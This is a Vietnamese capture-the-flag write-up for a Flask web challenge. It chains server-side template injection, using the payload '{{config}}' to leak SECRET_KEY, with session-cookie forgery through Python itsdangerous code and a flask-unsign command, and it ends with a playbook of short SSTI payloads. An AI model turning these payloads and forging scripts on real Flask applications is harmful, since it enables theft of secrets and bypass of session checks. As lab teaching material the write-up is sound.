# ssti-flask-cookie

- **Category:** Web (SSTI + Flask Session Forgery)
- **File đề:** Đề online, **có kèm source code Flask** (distributed source). PDF trích các đoạn quan trọng: route `/`, cách sinh `secret_key`, template có SSTI. Không có artifact nhị phân.

## Tóm tắt đề
Ứng dụng web hiển thị một phép tính đơn giản (ví dụ `145792 - 91325 = ?`). Khi nhập **đúng** kết quả, app lại hiện "too late..." thay vì flag. Phải đọc source để hiểu điều kiện lấy flag và tìm đường bypass.

## Phân tích (chi tiết: hằng số/offset/payload/khóa thật)
**Đoạn xử lý chính (Flask):**
```python
@app.route("/", methods=["POST"])
def answer():
    ans = str(request.form["ans"])
    if ("ans" in session) and (ans == str(session["ans"])):
        if time() < session["time"]:
            with open("flag.txt", "r") as f:
                message = f.read()
        else:
            message = "too late..."
    else:
        message = "invalid."
    return make_result_html(message, ans)
```
Điều kiện ra flag: đáp án đúng **và** `time() < session["time"]` — tức mốc thời gian lưu trong session phải nằm ở **tương lai** so với lúc server nhận request. Bình thường `session["time"]` server đặt là mốc quá khứ → luôn "too late". Phải **giả mạo session** để đẩy `time` ra tương lai.

**Session của Flask là cookie Base64 có ký bằng `secret_key`.** Muốn sửa cookie phải có `secret_key`. Source cho thấy key sinh ngẫu nhiên lúc khởi động, **chỉ 16 ký tự chữ thường a–z**:
```python
alpherbet = [chr(c) for c in range(97, 123)]          # 'a'..'z'
app.secret_key = ''.join(random.choice(alpherbet) for _ in range(16))
app.permanent_session_lifetime = timedelta(minutes=3)
```
Charset hẹp (26^16) nhưng **không cần brute** vì có thể **leak thẳng**.

**SSTI:** giá trị `ans` được nhúng vào template, nhưng **bị cắt còn 10 ký tự** (`ans[:10]`):
```python
<label class="label">%s</label>
<p>your answer is : %s</p>
""" % (message, ans[:10])
```
Giới hạn 10 ký tự, nhưng payload **`{{config}}`** chỉ **9 ký tự** → **vừa khít**. `{{config}}` in ra đối tượng `config` của Flask, trong đó có **`SECRET_KEY`**.

**Chuỗi khai thác (khóa thật):** SSTI `{{config}}` → leak `SECRET_KEY` (16 ký tự a–z) → dùng key ký lại cookie session với `time` = mốc xa tương lai (`9999999999`) và `ans` khớp → gửi lại → qua điều kiện `time() < session["time"]` → đọc `flag.txt`.

## Kỹ thuật áp dụng (+ VÌ SAO nhận ra)
- **SSTI (Server-Side Template Injection)** qua `ans` → payload ngắn `{{config}}` (9 ký tự) leak `SECRET_KEY`, vượt giới hạn 10 ký tự.
- **Flask session forgery:** biết `secret_key` → ký lại cookie `session` (dùng `itsdangerous`/`flask-unsign`) để sửa trường `time`.
- **Logic flaw thời gian:** `time() < session["time"]` bị bypass vì `time` do client giữ (dù đã ký) → ký được là sửa được, đặt cực đại.
- **VÌ SAO nhận ra:** source lộ điều kiện so sánh thời gian + session ký bằng secret_key; `ans[:10]` + reflect vào template → nghĩ ngay SSTI với payload ngắn. `secret_key` chỉ a–z/16 là yếu, nhưng SSTI leak thẳng nên khỏi brute.

## Lời giải chi tiết (bước + code/lệnh/payload sạch, chạy lại được)
1. **Leak SECRET_KEY bằng SSTI.** Gửi POST `ans={{config}}`; response chứa dump `config` với `'SECRET_KEY': '<16 ký tự a-z>'`:
   ```python
   import requests
   url = "http://<target>/"
   r = requests.post(url, data={"ans": "{{config}}"})
   # HTML escape dấu nháy đơn thành &#39;
   secret_key = r.text.split("SECRET_KEY&#39;: &#39;")[1].split("&")[0]
   print(secret_key)
   ```

2. **Giả mạo cookie session** với `time` tương lai, ký bằng key vừa leak:
   ```python
   from flask.sessions import SecureCookieSessionInterface
   from itsdangerous import URLSafeTimedSerializer

   class SimpleSCI(SecureCookieSessionInterface):
       def get_signing_serializer(self, secret_key):
           signer_kwargs = {'key_derivation': self.key_derivation,
                            'digest_method': self.digest_method}
           return URLSafeTimedSerializer(secret_key, salt=self.salt,
                                         serializer=self.serializer,
                                         signer_kwargs=signer_kwargs)

   def encode_session(secret_key, session):
       return SimpleSCI().get_signing_serializer(secret_key).dumps(session)

   ans = 0
   session = {"ans": ans, "time": 9999999999}      # mốc rất xa tương lai
   cookie_value = encode_session(secret_key, session)
   ```

3. **Gửi lại answer với cookie giả mạo** (và `ans` khớp giá trị trong session):
   ```python
   headers = {"Cookie": "session=" + cookie_value}
   r = requests.post(url, headers=headers, data={"ans": ans})
   print(r.text)       # response chứa nội dung flag.txt
   ```

   Thay thế bằng `flask-unsign`:
   ```bash
   flask-unsign --sign --cookie "{'ans': 0, 'time': 9999999999}" --secret '<secret_key>'
   # dùng cookie đó gửi kèm POST ans=0
   ```

## Flag
flag{...}

*(Nguồn không nêu: PDF/`SOLUTIONS_VN.md` bài #35 — flag là nội dung `flag.txt`, chỉ hiện trên server qua SSTI + cookie forgery, không in. Flag thật có wrapper `flag{...}`.)*

## Gặp lại thì xử lý thế nào (playbook)
- **Dấu hiệu SSTI:** input phản chiếu vào trang + framework template (Jinja2/Flask). Test nhanh `{{7*7}}` → ra `49` là SSTI. Với giới hạn độ dài, nhớ payload ngắn: `{{config}}`, `{{self}}`, `{{g}}`, `{{request}}`.
- **Leak secret của Flask:** `{{config}}` thường lộ `SECRET_KEY`, DB URI... Có key → giả mạo mọi session.
- **Flask session forgery:** `flask-unsign` (decode/brute/sign) hoặc `itsdangerous` trực tiếp. Không leak được mà key yếu (a–z/16) → brute offline `flask-unsign --wordlist`.
- **Logic flaw session:** điều kiện dựa trên giá trị trong session/cookie do client giữ (dù đã ký) → ký được là sửa được; đặt giá trị cực đại.
- **Bẫy:** HTML-escape trong output (`&#39;` thay `'`) khi parse key; `permanent_session_lifetime` 3 phút + key đổi mỗi lần restart → phải leak lại; salt/serializer phải khớp Flask mặc định; `ans` phải khớp giá trị session đã forge.
- **Checklist:** [ ] reflect + template? thử `{{7*7}}` [ ] `{{config}}` leak SECRET_KEY [ ] ký lại session với `time` tương lai [ ] gửi cookie + `ans` khớp [ ] đọc flag.
